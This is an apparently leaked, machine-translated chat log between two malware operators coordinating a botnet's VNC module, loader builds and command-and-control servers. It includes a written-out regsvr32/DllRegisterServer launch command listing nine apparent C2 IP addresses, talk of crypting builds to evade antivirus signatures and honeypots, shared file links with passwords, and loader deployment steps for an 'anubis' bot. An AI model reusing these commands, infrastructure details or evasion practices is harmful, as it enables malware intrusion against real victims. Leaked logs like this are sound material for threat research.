+[22.11.21 10:50:10] angelo: KHGd73idd209u2hd7lxiVJSjd2d7@*2yhdi8d2
+[22.11.21 10:51:13] angelo: take your time
+[22.11.21 10:51:31] angelo: https://send.exploit.in/download/0370cf8cfe32370f/#yJLMYvIgm6X5SLLDzlMeSw
+[22.11.21 10:51:41] angelo: SC
+[22.11.21 10:51:45] angelo: in the notebook
+[22.11.21 10:59:40] angelo: said that in any bot the SHK did not work
+[22.11.21 11:03:52] angelo: so, as I understand there is nothing to do on these bots
+[22.11.21 11:03:54] angelo: that makes sense
+[22.11.21 11:04:00] angelo: only in new builds ?
+[22.11.21 11:04:19] angelo: I was just checking just in case
+[22.11.21 11:06:02] angelo: [03:05:12] <cherry> why not upgrade
+[03:05:17] <cherry> just dll all bots?
+[03:05:23] <cherry> which are already there?
+[22.11.21 11:06:10] angelo: how better to answer ?
+[22.11.21 11:07:34] angelo: okay thanks
+[11/23/11/21 11:58:30] collin: hi!
+[23.11.21 11:59:07] angelo: hi !
+[23.11.21 11:59:58] angelo: hmm
+[23.11.21 12:00:00] angelo: paid ?
+[11/23/11/21 12:35:17] angelo: now
+[23.11.21 12:35:23] angelo: a moment
+[23.11.21 12:37:55] angelo: come on
+[23.11.21 12:41:15] angelo: check
+[23.11.21 12:44:26] angelo: Oh it worked!
+[23.11.21 12:44:32] angelo: thanks a lot !
+[29.11.21 08:59:53] angelo: hi !
+[29.11.21 09:00:32] collin: hi !
+[29.11.21 09:00:50] angelo: Graham threw the assembly of VNC
+[29.11.21 09:00:52] angelo: We have to check it out.
+[29.11.21 09:01:21] angelo: I'd like to test bot
+[29.11.21 09:01:40] collin: vnts combat new or test?
+[29.11.21 09:01:42] collin: he didn't send me
+[29.11.21 09:01:56] angelo: He did it on Friday night
+[29.11.21 09:02:00] angelo: do you want it?
+[29.11.21 09:02:27] collin: come on
+[29.11.21 09:02:35] angelo: we couldn't run the vntz version that was on the panel, no way it worked
+[29.11.21 09:03:45] angelo: https://privnote.com/acYDLgWu#HHBpdvLVk
+[29.11.21 09:04:09] angelo: https://file.io/S1IoM8Y5r3Ok
+[29.11.21 09:04:53] angelo: there are 2 main changes:
+port transfer with pad list
+and running via regsvr32 with parameters
+Also removed check to get the ip of the first network interface, maybe in it, but the signatures have changed a little, may live for a long time
+[29.11.21 09:08:21] collin: any proclets relevant to vnts bridge?
+[29.11.21 09:08:47] collin: I'll order the assembly
+[29.11.21 09:10:04] angelo: sec
+[29.11.21 09:10:56] angelo: 45.58.53.100
+65.108.52.202
+185.45.192.196
+80.71.158.23
+192.144.39.199
+198.252.108.108
+45.42.201.169
+172.83.155.186
+45.42.201.179
+[29.11.21 09:11:28] collin: wait for BC build from Royal, it will be for start and crypto in exe
+[29.11.21 09:11:53] collin: these procs all have standard port, you don't need to reassign on some?
+[29.11.21 09:12:27] angelo: standard 9090
+[29.11.21 09:13:02] angelo: adam sat on uk ?
+[29.11.21 09:13:30] angelo: I thought he was our admin
+[29.11.21 09:15:54] collin: what do you mean sat down?
+[29.11.21 09:16:32] collin: he periodically does something with bots by partners' requests, he didn't say what exactly
+[29.11.21 09:16:46] angelo: i got it, i thought he started working with bk
+[29.11.21 09:17:06] angelo: as a partner
+[29.11.21 09:27:05] collin: `and launch via regsvr32 with parameters` as he wrote - it would be difficult to do so on BC, via drop+start bat command only...
+[29.11.21 09:30:12] angelo: I'm not good at this, so I only took vntz, and it was already 1 am
+[29.11.21 10:08:25] angelo: tell me if you can run the module now?
+[29.11.21 10:08:31] angelo: that's what I threw
+[29.11.21 10:09:44] collin: on combat?
+[29.11.21 10:09:56] collin: better check on the test one first, if it's not checked
+[29.11.21 10:10:06] collin: old-style only rundll32
+[29.11.21 10:10:24] angelo: got it, so the command is the same
+[29.11.21 10:12:08] collin: What were the problems with it, the old version wouldn't run
+[29.11.21 10:12:11] collin: or something else?
+[29.11.21 10:12:21] angelo: the old one wouldn't start
+[29.11.21 10:12:24] angelo: I don't understand why
+[29.11.21 10:12:30] angelo: Wylde and I were torturing him
+[29.11.21 10:12:47] collin: wasn't it tapping or did you write error/fail directly on the bots?
+[29.11.21 10:12:58] angelo: no, it didn't start vntz
+[29.11.21 10:13:09] angelo: the command worked
+[29.11.21 10:29:38] angelo: and why in the status newbie bot writes that it is offline ?
+[29.11.21 10:30:21] collin: where is it how?
+[29.11.21 10:30:50] angelo: 185.176.222.56
+[29.11.21 10:30:52] angelo: test
+[29.11.21 10:31:18] collin: did you run it?
+[29.11.21 10:31:23] collin: from royal's build?
+[29.11.21 10:31:24] angelo: yes
+[29.11.21 10:31:27] angelo: yes.
+[29.11.21 10:31:33] collin: the id is wrong, something's wrong
+[29.11.21 10:31:42] angelo: I'll tell him.
+[29.11.21 10:32:08] collin: with such id's should go to junkies right away
+[29.11.21 10:32:24] angelo: yes
+[29.11.21 10:32:27] angelo: I put it into the test ones
+[29.11.21 10:32:52] collin: maybe it's not yours?
+[29.11.21 10:33:01] angelo: it's mine
+[29.11.21 10:33:03] angelo: It's mine.
+[29.11.21 10:33:06] angelo: no other
+[29.11.21 10:36:21] collin: Judging by the log, bot didn't snitch, only the lowader
+[29.11.21 10:36:22] collin: strange
+[29.11.21 10:37:44] angelo: I'll run with logs
+[29.11.21 10:37:57] collin: did you give me your IP for whitelisting?
+[29.11.21 10:38:08] angelo: no
+[29.11.21 10:38:11] angelo: new
+[29.11.21 10:38:11] angelo: w
+[29.11.21 10:38:21] angelo: 185.176.222.56
+[29.11.21 10:38:24] collin: all right then, loeder sat in the janipots
+[29.11.21 10:39:09] collin: added IP, try again
+[29.11.21 10:39:18] angelo: ok
+[29.11.21 11:07:52] angelo: for clarity Rantip put RAndoll32 and the command is the same with the new ips DllRegisterServer --id %id% --group %group% --ip 45.58.53.100,65.108.52.202,185.45.192.196,80.71.158.23,192.144.39.199,198.252.108.108,45.42.201.169,172.83.155.186,45.42.201.179
+[29.11.21 11:09:13] collin: Yeah.
+[29.11.21 11:09:36] collin: you tapped vntz?
+[29.11.21 11:09:48] angelo: one sec.
+[29.11.21 11:10:26] angelo: yes
+[29.11.21 11:13:25] angelo: krypt check and give adam as I understand
+[29.11.21 11:19:11] collin: crypt vntz?
+[29.11.21 11:19:50] angelo: I checked the source
+[29.11.21 11:19:59] angelo: 5 minutes
+[29.11.21 11:20:05] angelo: check prt
+[29.11.21 11:20:30] angelo: I don't understand why that vntz source stopped working on friday, there was no prerequisite
+[29.11.21 11:34:09] angelo: and for crypt vnts bk and randl32 are equivalent?
+[29.11.21 11:35:46] collin: both should work
+[29.11.21 12:26:52] angelo: slid by tric
+[29.11.21 12:26:58] angelo: team lead
+[30.11.21 13:57:43] angelo: hi !
+[30.11.21 14:00:10] collin: hi !
+[03.12.21 14:17:04] angelo: hi
+[03.12.21 14:17:30] collin: hi!
+[03.12.21 14:17:46] angelo: derek gave it to me to check.
+[03.12.21 14:17:48] angelo: 11 group
+[03.12.21 14:17:57] angelo: silence
+[03.12.21 14:18:06] angelo: mb long knock ?
+[03.12.21 14:18:38] collin: about 10-15 minutes
+[03.12.21 14:19:04] collin: maybe new ipi, not in white list?
+[03.12.21 14:19:18] angelo: but he's still supposed to knock like that time
+[03.12.21 14:19:20] angelo: without idi
+[03.12.21 14:19:26] angelo: 185.176.220.233
+[03.12.21 14:19:29] angelo: isn't it?
+[03.12.21 14:20:50] collin: he knocked 20 minutes ago
+[03.12.21 14:21:23] collin: the address was on the blacklist, added it
+[03.12.21 14:21:30] angelo: what the
+[03.12.21 14:21:37] angelo: I kinda started it 10 minutes ago
+[03.12.21 14:22:54] collin: 4 minutes ago last knock
+[03.12.21 14:23:03] angelo: ok
+[12/03/221 14:23:06] angelo: thanks !
+[03.12.21 14:23:08] collin: for some reason in the stats in the hanypotas is not reflected
+[03.12.21 14:23:21] angelo: well, that's the times I knocked out of the blacklist
+[03.12.21 14:24:48] collin: something must have gone wrong on the server side
+[03.12.21 14:25:05] collin: I knocked 7 and 10 minutes ago, there are reports in the main log
+[03.12.21 14:25:38] angelo: the main thing is knocking, gluing was checked
+[06.12.21 14:11:58] angelo: hi.
+[06.12.21 14:17:51] collin: hi!
+[06.12.21 14:18:06] angelo: ran two glues
+[06.12.21 14:18:12] angelo: I think they went black
+[06.12.21 14:18:19] angelo: at 83.136.182.35
+[06.12.21 14:23:29] collin: didn't knock, added to whitelist
+[06.12.21 14:23:36] collin: main addresses on the builds are on abuzz, it takes a long time to knock
+[06.12.21 14:23:48] collin: checked now - 45 minutes to bang
+[06.12.21 14:23:58] angelo: 45 0_0
+[06.12.21 14:24:01] angelo: but it is possible ?
+[06.12.21 14:24:06] angelo: long time
+[06.12.21 14:25:55] collin: derek said okay
+[06.12.21 14:26:16] angelo: looking at them, I think everything is okay)
+[08.12.21 09:13:33] collin: hi!
+[12/27/221 07:44:59] collin: hi!
+[12/27/221 07:45:59] angelo: Hi!
+[27.12.21 07:46:20] collin: about anubis, do you patch init module via "builder"?
+[27.12.21 07:46:29] collin: this:
+[27.12.21 07:46:31] collin: ``
+To create builds (bot init file)
+1) go to the folder with the builder\builder\
+2) edit the \builder\config.bat file
+
+PRJ_NAME - project name as in the admin panel
+UPDATE_VER - version of the update
+URL_PATH - path to push to
+HOST_LIST - list of domains which will be triggered
+
+ZIP_PASS is a optional parameter that sets the password for the archive to be created
+```
+[27.12.21 07:46:54] angelo: no module, only bot
+[27.12.21 07:47:04] collin: Who does this?
+[27.12.21 07:47:13] angelo: hmm
+[27.12.21 07:47:27] angelo: sec
+[12/27/221 07:47:46] angelo: hold on.
+[12/27/221 07:47:54] angelo: me)
+[27.12.21 07:48:16] collin: do you want me to send you collected modules?
+[27.12.21 07:48:17] collin: binary
+[27.12.21 07:48:27] collin: loader and init
+[27.12.21 07:48:34] collin: I built them at Bezdar's request
+[27.12.21 07:48:39] angelo: for me yes
+[27.12.21 07:48:41] collin: from the sources the coder gave me
+[27.12.21 07:49:21] angelo: sorry, bro, it's been a sleepless night, I'm working on it like an alarm clock
+[27.12.21 07:49:48] angelo: did you make bot and loader ?
+[27.12.21 07:50:03] angelo: now need to update through the admin anubis
+[27.12.21 07:50:11] collin: loader and init only
+[27.12.21 07:50:14] collin: botpack I have no sources
+[12/27/221 07:57:48] collin: ``
+h4nsK(Le4ns#Jrnsk5V8JEh
+https://privatlab.com/s/v/8RarLp8jMYFmGnOr9VGe
+https://privatlab.com/s/d/8RarLp8jMYFmGnOr9VGe/ZOYQg#delete
+```
+[27.12.21 07:58:15] collin: hold the binary, try to prepare them
+[27.12.21 08:02:21] angelo: let's make it quick
+[27.12.21 08:02:32] angelo: did you build loeder ?
+[27.12.21 08:02:35] angelo: and the bot itself ?
+[27.12.21 08:02:43] collin: loader and init modules
+[27.12.21 08:03:00] collin: without botpack
+[27.12.21 08:03:44] angelo: Bear with me
+[27.12.21 08:03:56] angelo: what is init ?
+[27.12.21 08:04:18] angelo: loader is created from the second admin
+[27.12.21 08:04:54] angelo: i'm fuckin' tight now
+[27.12.21 08:04:55] collin: I have sources for two modules looder and init
+[27.12.21 08:04:58] collin: it's the init that gets patched
+[27.12.21 08:05:06] collin: you must know more about this bot than I do.)
+[27.12.21 08:05:14] collin: I can send you all the source package + docks, the ones you gave me
+[27.12.21 08:05:30] angelo: let me check the files
+[27.12.21 08:09:23] angelo: well, two yafels I know
+[27.12.21 08:09:29] angelo: they were in the builder for the bot build
+[27.12.21 08:09:39] angelo: lib I don't know why or where they are from
+[27.12.21 08:09:59] collin: i don't know it either, it was bundled
+[27.12.21 08:10:11] angelo: ) let's see
+[27.12.21 08:10:46] collin: about libs in my docks...
+[27.12.21 08:17:37] angelo: yeah, we all don't understand what this build was for
+[27.12.21 08:17:44] angelo: I'll check with Bezdar.
+[12/27/221 08:18:34] collin: `[12/24/2021 12:14:30] <bezdar> at least rebuild the loeder from what you have
+[27.12.21 08:18:51] collin: well, he wrote, I told him what I have - asked to make what I have...
+[27.12.21 08:20:12] angelo: yeah, a little more clarity
+[27.12.21 08:20:17] angelo: the question was about the lowader
+[27.12.21 08:23:10] angelo: were there any water data during build?
+[27.12.21 08:23:20] angelo: domains/vps
+[27.12.21 08:23:56] collin: I don't have any
+[27.12.21 08:24:05] collin: you must specify them when you patch module init
+[27.12.21 08:24:29] angelo: that's the whole question
+[27.12.21 08:24:32] angelo: now
+[27.12.21 08:36:33] angelo: send me the manual
+[27.12.21 08:36:54] collin: instruction about what?
+[27.12.21 08:37:05] angelo: what you were sent
+[27.12.21 08:37:07] angelo: what is it
+[27.12.21 08:37:21] angelo: you got to figure out where to throw the source code on the looder
+[27.12.21 08:39:35] collin: ``
+U94n%Baj4ne8k$Ndj8ke
+https://privatlab.com/s/v/ero5zakZG4h78dDbeE8L
+https://privatlab.com/s/d/ero5zakZG4h78dDbeE8L/jL0az#delete
+```
+[27.12.21 08:42:32] angelo: here's the answer
+[27.12.21 08:42:34] angelo: 2) take the files
+\{bin\RELEASE\loader_dll_64.dll
+\bin\RELEASE\loader_exe_64.exe
+3) copy (replace existing) them to the server in the folder
+/mnt/work/loader_v2/storage/loader/
+4) after that you can build the loader in its admin area
+[14.02.22 15:01:43] angelo: hi !
+[14.02.22 15:01:47] angelo: need a minute
+[14.02.22 15:05:37] angelo: here ?
+[14.02.22 15:33:39] collin: hi !
+[14.02.22 15:36:15] angelo: go!
+[14.02.22 15:36:22] angelo: or in the group look my question
+[14.02.22 15:37:13] collin: turn it on
+[14.02.22 15:37:27] angelo: shorter
+[14.02.22 15:37:28] collin: what address
+[14.02.22 15:37:42] angelo: 195.123.240.41
+[14.02.22 15:38:09] collin: for tests?
+[14.02.22 15:38:19] angelo: yeah
+[14.02.22 15:38:20] angelo: mine
+[14.02.22 15:38:23] collin: added
+[14.02.22 15:38:28] angelo: thanks.
+[14.02.22 16:29:34] angelo: whose sudos ?
+[21.02.22 15:32:27] angelo: hi
+[21.02.22 15:32:40] angelo: otr
